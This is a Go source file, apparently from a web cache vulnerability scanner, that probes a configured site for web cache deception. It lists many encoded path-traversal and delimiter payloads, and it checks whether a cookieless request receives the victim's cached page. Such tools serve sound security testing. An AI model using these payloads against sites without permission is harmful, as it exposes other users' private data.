package pkg

import (
	"errors"
	"fmt"
	"strings"
	"time"

	"github.com/valyala/fasthttp"
	"github.com/xplorfin/fasthttp2curl"
)

func TestWebCacheDeception() reportResult {
	var repResult reportResult
	repResult.Technique = "Cache Deception"

	// cacheable extensions: class, css, jar, js, jpg, jpeg, gif, ico, png, bmp, pict, csv, doc, docx, xls, xlsx, ps, pdf, pls, ppt, pptx, tif, tiff, ttf, otf, webp, woff, woff2, svg, svgz, eot, eps, ejs, swf, torrent, midi, mid

	appendings := []string{
		// --- CSS extension ---
		"/.css",                   // Path parameter
		"/nonexistent1.css",       // Path parameter
		"/../nonexistent2.css",    // Path traversal
		"/%2e%2e/nonexistent3.css", // Encoded path traversal
		"%0Anonexistent4.css",     // Encoded Newline
		"%00nonexistent5.css",     // Encoded Null Byte
		"%09nonexistent6.css",     // Encoded Tab
		"%3Bnonexistent7.css",     // Encoded Semicolon
		"%23nonexistent8.css",     // Encoded Pound
		"%3Fname=valnonexistent9.css",  // Encoded Question Mark
		"%26name=valnonexistent10.css", // Encoded Ampersand
		";nonexistent11.css",      // Semicolon
		"?nonexistent12.css",      // Question Mark
		"&nonexistent13.css",      // Ampersand
		// --- JS extension (common static asset) ---
		"/nonexistent1.js",        // Path parameter JS
		"/../nonexistent2.js",     // Path traversal JS
		"%0Anonexistent4.js",      // Encoded Newline JS
		"%3Bnonexistent7.js",      // Encoded Semicolon JS
		";nonexistent11.js",       // Semicolon JS
		"?nonexistent12.js",       // Question Mark JS
		// --- Other static file extensions ---
		"/nonexistent1.png",       // PNG image extension
		"/nonexistent1.ico",       // Favicon extension
		"/nonexistent1.woff2",     // Web font extension
		"/nonexistent1.svg",       // SVG extension
		"/nonexistent1.json",      // JSON extension
		"?nonexistent.json",       // Question Mark JSON
		";nonexistent.png",        // Semicolon PNG
		// --- Web-cache normalization: %2F treated as / by cache but not origin ---
		"%2F..%2Fnonexistentcache1.css",     // Web cache normalization (CSS)
		"%2F..%2Fnonexistentcache2.js",      // Web cache normalization (JS)
		"%2F..%2F..%2Fnonexistentcache3.css", // Double traversal web cache normalization
		// --- Double URL-encoding ---
		"%252e%252e%2Fnonexistent1.css",     // Double URL-encoded path traversal
		"%252F..%252Fnonexistent2.css",      // Double-encoded slash traversal
		// --- Nginx off-by-slash: path traversal normalization ---
		"/..;/nonexistent1.css",             // Tomcat/Java path traversal via semicolon
		"..%2Fnonexistent1.css",             // Relative path traversal
		// --- Encoded path traversal to static directory using Encoded Newline ---
		"%0A%2f%2e%2e%2fresources%2fnonexistent1.css",
		"%00%2f%2e%2e%2fresources%2fnonexistent2.css",
		"%09%2f%2e%2e%2fresources%2fnonexistent3.css",
		"%3B%2f%2e%2e%2fresources%2fnonexistent4.css",
		"%23%2f%2e%2e%2fresources%2fnonexistent5.css",
		"%3F%2f%2e%2e%2fresources%2fnonexistent6.css",
		"%26%2f%2e%2e%2fresources%2fnonexistent7.css",
		";%2f%2e%2e%2fresources%2fnonexistent8.css",
		"?%2f%2e%2e%2fresources%2fnonexistent9.css",
		"&%2f%2e%2e%2fresources%2fnonexistent10.css",
		// --- Single-level encoded path traversal to robots.txt (e.g. PortSwigger Lab 5 pattern) ---
		// Pattern: <delimiter>%2f%2e%2e%2frobots.txt
		// The cache treats the appended path as a static file; the origin resolves the traversal.
		";%2f%2e%2e%2frobots.txt",      // Semicolon + single-level encoded traversal
		"?%2f%2e%2e%2frobots.txt",      // Question mark + single-level encoded traversal
		"&%2f%2e%2e%2frobots.txt",      // Ampersand + single-level encoded traversal
		"%0A%2f%2e%2e%2frobots.txt",    // Encoded Newline + single-level encoded traversal
		"%09%2f%2e%2e%2frobots.txt",    // Encoded Tab + single-level encoded traversal
		"%00%2f%2e%2e%2frobots.txt",    // Encoded Null Byte + single-level encoded traversal
		"%3B%2f%2e%2e%2frobots.txt",    // Encoded Semicolon + single-level encoded traversal
		"%23%2f%2e%2e%2frobots.txt",    // Encoded Pound + single-level encoded traversal
		"%3F%2f%2e%2e%2frobots.txt",    // Encoded Question Mark + single-level encoded traversal
		"%26%2f%2e%2e%2frobots.txt",    // Encoded Ampersand + single-level encoded traversal
		// --- Multi-level encoded path traversal to robots.txt (deep traversal fallback) ---
		"%0A%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2frobots.txt",
		"%00%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2frobots.txt",
		"%09%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2frobots.txt",
		"%3B%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2frobots.txt",
		"%23%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2frobots.txt",
		"%3F%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2frobots.txt",
		"%26%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2frobots.txt",
		";%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2frobots.txt",
		"?%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2frobots.txt",
		"&%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2frobots.txt",
	}

	// Static directory prefixes used for "Exploiting normalization by the origin server"
	// The cache treats these as static assets; the origin normalizes the %2F..%2F away.
	originNormPrefixes := []string{
		"static",
		"assets",
		"resources",
		"js",
		"css",
		"img",
		"images",
		"public",
		"files",
		"media",
	}

	if Config.Website.StatusCode != 200 || Config.Website.Body == "" {
		msg := "Skipping Web Cache Deception test, as it requires a valid website configuration with a status code of 200 and a non-empty body.\n"
		Print(msg, Yellow)
		repResult.HasError = true
		repResult.ErrorMessages = append(repResult.ErrorMessages, msg)
		return repResult
	}
	PrintVerbose("Testing for Web Cache Deception\n", NoColor, 1)

	// test each appending one after another
	for _, appendStr := range appendings {
		err := webCacheDeceptionTemplate(&repResult, appendStr)
		if err != nil {
			repResult.HasError = true
			repResult.ErrorMessages = append(repResult.ErrorMessages, err.Error())
		}
	}

	// Test "Exploiting normalization by the origin server":
	// Cache sees /STATIC_PREFIX/..%2FORIGINAL_PATH as cacheable static asset.
	// Origin normalizes %2F..%2F away and serves the original sensitive page.
	PrintVerbose("Testing for Web Cache Deception via origin server normalization\n", NoColor, 1)
	for _, prefix := range originNormPrefixes {
		err := webCacheDeceptionOriginNormTemplate(&repResult, prefix)
		if err != nil {
			repResult.HasError = true
			repResult.ErrorMessages = append(repResult.ErrorMessages, err.Error())
		}
	}

	return repResult
}

func webCacheDeceptionTemplate(repResult *reportResult, appendStr string) error {
	var msg string
	var repCheck reportCheck
	req := fasthttp.AcquireRequest()
	resp := fasthttp.AcquireResponse()
	defer fasthttp.ReleaseRequest(req)
	defer fasthttp.ReleaseResponse(resp)
	var err error

	rUrl := Config.Website.Url.String()
	// Überprüfen, ob der String genau zwei `//` enthält
	if strings.Count(rUrl, "/") == 2 && !strings.HasPrefix(appendStr, "/") {
		// append `/`, so e.g. https://example%0A does not throw an error when building the request
		rUrl += "/"
	}

	req.Header.SetMethod("GET")
	req.SetRequestURI(rUrl + appendStr)
	setRequest(req, false, "", nil, false)

	err = client.Do(req, resp)
	if err != nil {
		msg = fmt.Sprintf("webCacheDeceptionTemplate: %s: client.Do: %s\n", appendStr, err.Error())
		Print(msg, Red)
		return errors.New(msg)
	}

	waitLimiter("Web Cache Deception")

	if resp.StatusCode() != Config.Website.StatusCode || string(resp.Body()) != Config.Website.Body {
		return nil // no cache deception, as the response is not the same as the original one
	}

	if Config.Website.Cache.NoCache || Config.Website.Cache.Indicator == "age" {
		time.Sleep(1 * time.Second) // wait a second to ensure that age header is not set to 0
	}

	waitLimiter("Web Cache Deception")

	// Verification request sent WITHOUT cookies to simulate an unauthenticated attacker.
	// True web cache deception requires that an attacker (without the victim's session) can
	// access the cached sensitive response. If the cache uses the session cookie as part of
	// its cache key, the attacker's request would be a miss, not a hit — and should not be
	// reported as a finding. Sending without cookies eliminates this class of false positives.
	reqVerify := fasthttp.AcquireRequest()
	respVerify := fasthttp.AcquireResponse()
	defer fasthttp.ReleaseRequest(reqVerify)
	defer fasthttp.ReleaseResponse(respVerify)

	reqVerify.Header.SetMethod("GET")
	reqVerify.SetRequestURI(rUrl + appendStr)
	setRequestHeaders(reqVerify, "")

	err = client.Do(reqVerify, respVerify)
	if err != nil {
		msg = fmt.Sprintf("webCacheDeceptionTemplate: %s: client.Do verify: %s\n", appendStr, err.Error())
		Print(msg, Red)
		return errors.New(msg)
	}
	respHeader := headerToMultiMap(&respVerify.Header)

	// Add the request as curl command to the report
	command, err := fasthttp2curl.GetCurlCommandFastHttp(reqVerify)
	if err != nil {
		PrintVerbose("Error: fasthttp2curl: "+err.Error()+"\n", Yellow, 1)
	}

	repCheck.Request.CurlCommand = command.String()
	PrintVerbose("Curl command: "+repCheck.Request.CurlCommand+"\n", NoColor, 2)

	var cacheIndicators []string
	if Config.Website.Cache.Indicator == "" { // check if now a cache indicator exists
		cacheIndicators = analyzeCacheIndicator(respHeader)
	} else {
		cacheIndicators = []string{Config.Website.Cache.Indicator}
	}

	hit := false
	for _, indicator := range cacheIndicators {
		for _, v := range respHeader[indicator] {
			indicValue := strings.TrimSpace(strings.ToLower(v))
			if checkCacheHit(indicValue, Config.Website.Cache.Indicator) {
				hit = true
				Config.Website.Cache.Indicator = indicator
			}
		}
	}

	// check if there's a cache hit and if the body didn't change (otherwise it could be a cached error page, for example)
	if hit && string(respVerify.Body()) == Config.Website.Body && respVerify.StatusCode() == Config.Website.StatusCode {
		repResult.Vulnerable = true
		repCheck.Reason = "The response got cached due to Web Cache Deception"
		msg = fmt.Sprintf("%s was successfully decepted! appended: %s\n", rUrl, appendStr)
		Print(msg, Green)
		msg = "Curl: " + repCheck.Request.CurlCommand + "\n\n"
		Print(msg, Green)

		repCheck.Identifier = appendStr
		repCheck.URL = reqVerify.URI().String()
		// Dump the request
		repCheck.Request.Request = string(reqVerify.String())
		// Dump the response without the body
		respVerify.SkipBody = true
		repCheck.Request.Response = string(respVerify.String())

		repResult.Checks = append(repResult.Checks, repCheck)
	} else {
		PrintVerbose("Curl command: "+repCheck.Request.CurlCommand+"\n", NoColor, 2)
	}

	return nil
}

// webCacheDeceptionOriginNormTemplate tests "Exploiting normalization by the origin server":
// The cache treats /STATIC_PREFIX/..%2FORIGINAL_PATH as a cacheable static asset.
// The origin server normalizes the encoded traversal (%2F..%2F) and serves the original
// sensitive resource. If the cache stores the response, other users fetching the static
// path would receive the victim's cached sensitive data.
//
// Example: https://example.com/static/..%2Fmy-account
//   - Cache keys this as a path under /static/ → caches the response
//   - Origin decodes %2F to / → resolves /static/../my-account → /my-account
func webCacheDeceptionOriginNormTemplate(repResult *reportResult, staticPrefix string) error {
	var msg string
	var repCheck reportCheck
	req := fasthttp.AcquireRequest()
	resp := fasthttp.AcquireResponse()
	defer fasthttp.ReleaseRequest(req)
	defer fasthttp.ReleaseResponse(resp)

	// Build the modified URL: scheme://host/STATIC_PREFIX/..%2FORIGINAL_PATH
	// e.g. https://example.com/static/..%2Fmy-account
	parsedUrl := Config.Website.Url
	host := parsedUrl.Scheme + "://" + parsedUrl.Host
	originalPath := parsedUrl.RequestURI() // includes path + query string

	// Strip the leading / from the original path so we can construct
	// /STATIC_PREFIX/..%2FORIGINAL_PATH
	pathWithoutLeadingSlash := strings.TrimPrefix(originalPath, "/")
	modifiedPath := "/" + staticPrefix + "/..%2F" + pathWithoutLeadingSlash
	modifiedURL := host + modifiedPath

	req.Header.SetMethod("GET")
	req.SetRequestURI(modifiedURL)
	setRequest(req, false, "", nil, false)

	err := client.Do(req, resp)
	if err != nil {
		msg = fmt.Sprintf("webCacheDeceptionOriginNormTemplate: %s: client.Do: %s\n", staticPrefix, err.Error())
		Print(msg, Red)
		return errors.New(msg)
	}

	waitLimiter("Web Cache Deception Origin Normalization")

	// Only continue if the origin served the same body (sensitive data)
	if resp.StatusCode() != Config.Website.StatusCode || string(resp.Body()) != Config.Website.Body {
		return nil
	}

	if Config.Website.Cache.NoCache || Config.Website.Cache.Indicator == "age" {
		time.Sleep(1 * time.Second)
	}

	waitLimiter("Web Cache Deception Origin Normalization")

	// Verification request sent WITHOUT cookies to simulate an unauthenticated attacker.
	// True web cache deception requires that an attacker (without the victim's session) can
	// access the cached sensitive response. If the cache uses the session cookie as part of
	// its cache key, the attacker's request would be a miss, not a hit — and should not be
	// reported as a finding. Sending without cookies eliminates this class of false positives.
	reqVerify := fasthttp.AcquireRequest()
	respVerify := fasthttp.AcquireResponse()
	defer fasthttp.ReleaseRequest(reqVerify)
	defer fasthttp.ReleaseResponse(respVerify)

	reqVerify.Header.SetMethod("GET")
	reqVerify.SetRequestURI(modifiedURL)
	setRequestHeaders(reqVerify, "")

	err = client.Do(reqVerify, respVerify)
	if err != nil {
		msg = fmt.Sprintf("webCacheDeceptionOriginNormTemplate: %s: client.Do verify: %s\n", staticPrefix, err.Error())
		Print(msg, Red)
		return errors.New(msg)
	}
	respHeader := headerToMultiMap(&respVerify.Header)

	command, err := fasthttp2curl.GetCurlCommandFastHttp(reqVerify)
	if err != nil {
		PrintVerbose("Error: fasthttp2curl: "+err.Error()+"\n", Yellow, 1)
	}
	repCheck.Request.CurlCommand = command.String()
	PrintVerbose("Curl command: "+repCheck.Request.CurlCommand+"\n", NoColor, 2)

	var cacheIndicators []string
	if Config.Website.Cache.Indicator == "" {
		cacheIndicators = analyzeCacheIndicator(respHeader)
	} else {
		cacheIndicators = []string{Config.Website.Cache.Indicator}
	}

	hit := false
	for _, indicator := range cacheIndicators {
		for _, v := range respHeader[indicator] {
			indicValue := strings.TrimSpace(strings.ToLower(v))
			if checkCacheHit(indicValue, Config.Website.Cache.Indicator) {
				hit = true
				Config.Website.Cache.Indicator = indicator
			}
		}
	}

	if hit && string(respVerify.Body()) == Config.Website.Body && respVerify.StatusCode() == Config.Website.StatusCode {
		repResult.Vulnerable = true
		repCheck.Reason = "The response got cached due to Web Cache Deception via origin server normalization"
		identifier := "/" + staticPrefix + "/..%2F" + pathWithoutLeadingSlash
		msg = fmt.Sprintf("%s was successfully decepted via origin normalization! prefix: /%s/..%%2F\n", modifiedURL, staticPrefix)
		Print(msg, Green)
		msg = "Curl: " + repCheck.Request.CurlCommand + "\n\n"
		Print(msg, Green)

		repCheck.Identifier = identifier
		repCheck.URL = reqVerify.URI().String()
		repCheck.Request.Request = string(reqVerify.String())
		respVerify.SkipBody = true
		repCheck.Request.Response = string(respVerify.String())

		repResult.Checks = append(repResult.Checks, repCheck)
	} else {
		PrintVerbose("Curl command: "+repCheck.Request.CurlCommand+"\n", NoColor, 2)
	}

	return nil
}
